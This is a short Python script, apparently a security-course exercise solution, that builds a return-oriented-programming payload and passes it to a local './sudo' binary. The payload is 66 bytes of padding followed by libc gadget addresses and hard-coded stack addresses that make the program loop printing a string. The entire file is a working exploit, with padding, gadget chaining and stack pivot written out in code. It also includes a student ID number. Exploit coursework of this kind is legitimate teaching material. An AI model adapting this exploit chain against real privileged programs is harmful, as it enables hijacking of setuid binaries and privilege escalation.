import os, sys, struct

import assemble
from search import GadgetSearch

OFFSET = 66
LIBC_SA = 0xb7c3a750
ORIGINAL_RA = 0x080488C6
PUTS_ADDRESS = 0xb7c82ca0
MY_STRING_ADDRESS = 0xbfffe138
MY_LOOP_SA = 0xbfffe124
PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'
PATH_TO_GDB = '/usr/bin/gdb'

def get_string(student_id):
    return 'Take me (%s) to your leader!' % student_id


def get_arg():
	s = GadgetSearch(LIBC_DUMP_PATH, LIBC_SA)

	string = get_string(313296550) 

	res = 'a' * OFFSET

	pop_ebp_address = struct.pack('<I',s.find('pop ebp'))
	res += pop_ebp_address

	res += struct.pack('<I', PUTS_ADDRESS) * 2

	add_esp_4bytes_address = struct.pack('<I',s.find('add esp, 4'))
	res += add_esp_4bytes_address
	res += struct.pack('<I', MY_STRING_ADDRESS)

	pop_esp_address = struct.pack('<I',s.find('pop esp'))
	res += pop_esp_address

	res += struct.pack('<I', MY_LOOP_SA)

	res += string

	return res

def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg())

if __name__ == '__main__':
    main(sys.argv)
